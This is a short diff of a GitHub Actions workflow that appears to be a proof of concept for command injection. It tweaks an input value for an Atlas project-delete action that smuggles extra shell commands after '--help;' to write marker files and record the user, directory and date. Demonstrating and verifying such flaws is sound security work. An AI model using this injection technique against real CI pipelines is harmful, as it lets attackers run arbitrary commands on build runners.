@@ -21,7 +21,7 @@ jobs:
           # We use --help to make atlas succeed, then inject commands that execute
           # Format: atlas project delete ${{ inputs.delete-project-id }} --force
           # Using --help makes the command succeed, then our injected commands execute
-          delete-project-id: "--help --force; echo '🚨 COMMAND INJECTION SUCCESSFUL 🚨' > /tmp/poc-success.txt && echo 'Injected via delete-project-id!' && echo 'User:' $(whoami) && echo 'PWD:' $(pwd) && echo 'Date:' $(date) > /tmp/poc-delete-project-info.txt #"
+          delete-project-id: "--help; echo '🚨 COMMAND INJECTION SUCCESSFUL 🚨' > /tmp/poc-success.txt && echo 'Injected via delete-project-id!' && echo 'User:' $(whoami) && echo 'PWD:' $(pwd) && echo 'Date:' $(date) > /tmp/poc-delete-project-info.txt #"
 
       - name: Verify Injection
         shell: bash
